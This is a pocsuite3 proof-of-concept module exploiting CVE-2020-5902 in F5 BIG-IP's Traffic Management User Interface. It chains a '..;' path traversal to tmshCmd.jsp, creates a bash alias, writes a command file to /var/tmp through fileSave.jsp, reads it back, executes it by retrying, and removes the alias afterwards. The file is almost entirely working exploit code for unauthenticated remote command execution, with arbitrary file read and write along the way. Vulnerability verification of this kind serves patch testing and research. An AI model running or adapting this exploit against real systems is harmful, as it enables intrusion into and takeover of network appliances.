from urllib.parse import urlparse

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, CEye
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '3.0'
    author = ['d4m1ts']
    vulDate = '2020-07-06'
    createDate = '2020-07-06'
    updateDate = '2020-07-06'
    references = ['https://github.com/jas502n/CVE-2020-5902','https://raw.githubusercontent.com/rapid7/metasploit-framework/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb']
    name = 'F5 BIG-IP RCE（CVE-2020-5902）'
    appPowerLink = ''
    appName = 'F5 BIG-IP'
    appVersion = '15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1'
    vulType = 'Command Execution'
    desc = '''In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.
    '''
    cnnvd = ""
    cnvd = ""
    cve = "CVE-2020-5902"
    cvss3 = ""
    harm = "命令执行"
    level = "high"
    sug = '''升级'''
    vul_type = "web"
    pocname = "f5_big_ip_rce_cve_2020_5902"
    samples = []
    install_requires = ['']

    def _verify(self):
        result = {}
        randstr = random_str()
        protocol,host,port,rpath = self.parse_url(self.url)
        url = protocol + "://" + str(host) + ":" + str(port)

        fileName = "/var/tmp/tdfgjkl"   # 写到目标的
        cmd = "id"   # // ==> \/\/

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"}
        def create_alias(): # 开启bash
            payload = "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
            data={"command": "create cli alias private list command bash"}
            req = requests.post(url+payload, headers=headers, data=data)
            if req.json()['error'] == "":
                return True

        def upload_script(fileName,cmd):    # fileName ==> /tmp/ljkkasdv    任意文件上传
            payload = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
            data={"fileName": fileName, "content": cmd}
            req = requests.post(url+payload, headers=headers, data=data)
            if req.status_code == 200:
                return True

        def upload_check(fileName,cmd): # 任意文件读取
            payload = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={}".format(fileName)
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
            req = requests.get(url+payload, headers=headers)
            if cmd.replace("/","\\/") in req.text:
                logger.info("[+] Upload Success ! ==> {}".format(url+payload))
                return True

        def execute_script(fileName):   # if "uid" in
            payload = "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
            data={"command": "list {}".format(fileName)}
            for i in range(0,10):   # 重复多次可能会成功，一般是4次
                req = requests.post(url+payload, headers=headers, data=data)
                if req.json()['error'] == "" and "uid" in req.text:
                    print (req.text)
                    logger.info("[+] Execute OK, Having a check ...")
                    return True

        def delete_alias():
            payload = "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
            data={"command": "delete cli alias private list"}
            req = requests.post(url+payload, headers=headers, data=data)
            if req.json()['error'] == "":
                return True

        try:
            delete_alias()  # 可能被别人别名了，第一步先尝试删除别名不然可能报错！！！

            if create_alias():
                if upload_script(fileName,cmd):
                    if upload_check(fileName,cmd):
                        if execute_script(fileName):
                            if delete_alias():
                                result['VerifyInfo'] = {}
                                result['VerifyInfo']['URL'] = url
                                result['VerifyInfo']['Port'] = str(port)
                                return self.parse_output(result)
        except Exception as ex:
            logger.error(ex)

    def _attack(self):
        self._verify()

    def parse_url(self,url):
        urparse = urlparse(url)
        host = urparse.hostname
        protocol = urparse.scheme
        port = urparse.port if urparse.port else 443 if 'https' in protocol else 80
        path = urparse.path.rstrip('/') if urparse.path != '' else ''

        return protocol,host,port,path

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)
